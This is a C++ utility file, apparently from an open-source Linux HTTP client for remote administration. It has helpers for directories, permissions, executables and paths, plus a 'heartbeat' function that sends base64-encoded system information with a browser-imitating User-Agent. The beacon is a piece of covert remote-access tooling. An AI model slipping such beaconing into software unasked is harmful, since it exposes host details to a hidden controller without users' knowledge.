// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 



#include "utilities.h"
#include <sys/stat.h>
#include <unistd.h>
#include <fstream>
#include "json.h"
#include <iostream>
#include "systemInformation.h"
#include "stringUtil.h"
#include "base64.h"

std::wstring createHeartbeatRequest(const std::wstring &sysInfoInJson){
    std::string dataBase64 = base64_encode((unsigned char*)StringUtils::ws2s(sysInfoInJson).c_str(), sysInfoInJson.length());
    std::wstringstream contentLengthStream;
    contentLengthStream << dataBase64.length();
    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
    request += L"Connection: close\r\n"; 
    request += L"\r\n" + StringUtils::s2ws(dataBase64);
    return request;
}

bool isValidPort(const std::string& portNum) {

	for (char c : portNum) {
		if (!std::isdigit(c)) {
			std::cerr << "PORT is invalid, please put only the number for PORT [1 - 65535]\n";
			return false;
		}
	}
	try {
		int port = std::stoi(portNum);
		if (port < 1 || port > 65535) {
			std::cerr << "PORT is invalid, please select a PORT in the range [1 - 65535]\n";
			return false;
		}
	}
	catch (const std::invalid_argument&) {
		std::cerr << "PORT is invalid, please enter a valid number in the range [1 - 65535]\n";
		return false;
	}
	catch (const std::out_of_range&) {
		std::cerr << "PORT is invalid, number out of range\n";
		return false;
	}
	return true;
}

bool hasWritePermissionForDirectory(const std::wstring &dirPath){
    
    const std::wstring tmpFileName {L"fileXXXXxxxxx"};
    const std::wstring tmpFilePath = dirPath + L"/" + tmpFileName;
    std::ofstream tmpFile;
    tmpFile.open(fs::path(tmpFilePath));
    
    if(tmpFile.is_open()){              // Check for write permissions on destination directory before downloading files to it
        tmpFile.close();
        std::error_code ec;
        fs::remove(tmpFilePath, ec);    // Remove the temporary created file
        return true;
    }
    return false;
}

std::wstring changeDir(const std::wstring& newPath, std::error_code& ec) {
    fs::path newDirectory(newPath);
    if (fs::exists(newDirectory, ec) && fs::is_directory(newDirectory, ec)) {
        fs::current_path(newDirectory, ec); // Change the current directory to newPath
        if (!ec) {
            return fs::current_path().wstring(); // Return the new current directory path
        }
    }
    return L""; // Return an empty string if there was an error
}

std::wstring ExtractLastDirectoryName(const std::wstring& path) {
    std::wstringstream ss(path);
    std::wstring directory;
    std::wstring lastDirectory;
    while (std::getline(ss, directory, L'/')) {
        if (!directory.empty()) {
            lastDirectory = directory;
        }
    }
    return lastDirectory;
}

bool isExecutable(const std::wstring& path) {
    // Convert the wide string to a narrow string using wcstombs
    std::string narrowPath(path.begin(), path.end());

    struct stat fileInfo;
    if (stat(narrowPath.c_str(), &fileInfo) != 0) {
        std::cerr << "Error getting file info." << std::endl;
        return false;
    }

    // Check if the file is a regular file and has execute permission for user
    if (S_ISREG(fileInfo.st_mode) && (fileInfo.st_mode & S_IXUSR)) {
        return true;
    }

    return false;
}

size_t calculateDirectorySize(const std::string& path) {
    size_t size = 0;
    std::error_code ec;
    
    for (const auto & entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied, ec)) {
        auto fileType = fs::status(entry, ec).type();
        if (!ec) {                
            if (fileType == fs::file_type::regular)
                size += fs::file_size(entry.path(), ec);
            else if (fileType == fs::file_type::directory) {
                size_t subDirectorySize = calculateDirectorySize(entry.path());
                if (subDirectorySize == static_cast<size_t>(-1)) {
                    //std::cout << "Couldn't evaluate" << std::endl;
                    return static_cast<size_t>(-1);  // Return an error state
                }
                size += subDirectorySize;
            }
        } 
        else {
            return static_cast<size_t>(-1);  // Return an error state
        }       
    }
    return size;
}

std::string extractBase64Data(const std::wstring& buff) {
    std::size_t found = buff.find(L"\r\n\r\n");
    if (found != std::wstring::npos) {
        found += std::wstring(L"\r\n\r\n").length();
        return StringUtils::ws2s(buff.substr(found));
    }
    else {
        return std::string("");
    }
}

std::wstring ReplaceTildeWithPath(const std::wstring& filePath) {
    std::wstring result = filePath;
    size_t tildePos = result.find('~');
    if (tildePos != std::string::npos) {
        std::wstring homeDir = L"/home/" + SysInformation::getUserName(); //+ "/";
        result.replace(tildePos, 1, homeDir);
    }
    return result;
}

